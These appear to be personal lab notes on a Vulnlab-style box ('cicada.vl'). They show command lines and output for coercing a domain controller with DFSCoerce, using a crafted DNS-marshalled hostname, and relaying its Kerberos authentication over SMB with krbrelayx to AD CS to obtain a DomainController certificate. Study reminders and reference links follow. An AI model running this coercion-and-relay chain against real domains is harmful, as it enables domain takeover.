

use this when apt doesnt work look up how it works

```
kali@kali ~/krbrelayx (master) [1]> cat /etc/resolv.conf 
# Generated by NetworkManager
search localdomain
nameserver 192.168.3.2 <------------ default gateway

```



```
kali@kali ~/krbrelayx (master)> python krbrelayx.py -t 'http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC-JPQ225$'
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded.. 
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.10.121.196
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.10.121.196
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.10.121.196
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.10.121.196
[*] Skipping user DC-JPQ225$ since attack was already performed
[*] Skipping user DC-JPQ225$ since attack was already performed
[*] HTTP server returned status code 200, treating as a successful login
[*] Skipping user DC-JPQ225$ since attack was already performed
[*] GOT CERTIFICATE! ID 15
[*] Writing PKCS#12 certificate to ./DC-JPQ225$.pfx                                                                  
[*] Certificate successfully written to file                                                                         
```



```
kali@kali ~/DFSCoerce (main)> python dfscoerce.py -k -no-pass 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'
[-] Connecting to ncacn_np:DC-JPQ225.cicada.vl[\PIPE\netdfs]
[+] Successfully bound!
[-] Sending NetrDfsRemoveStdRoot!
NetrDfsRemoveStdRoot 
ServerName:                      'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\x00' 
RootShare:                       'test\x00' 
ApiFlags:                        1 


DFSNM SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.  <---- means it worked
```



- for Kerberos DNS
	- the record is what constains the data

- revise DNS
- look up etc resolve
- relaying module do that 
- use -h  more
- understand venv and how useful it is
- etc.

https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx#krbrelayx


unecessary but works:
https://github.com/CICADA8-Research/RemoteKrbRelay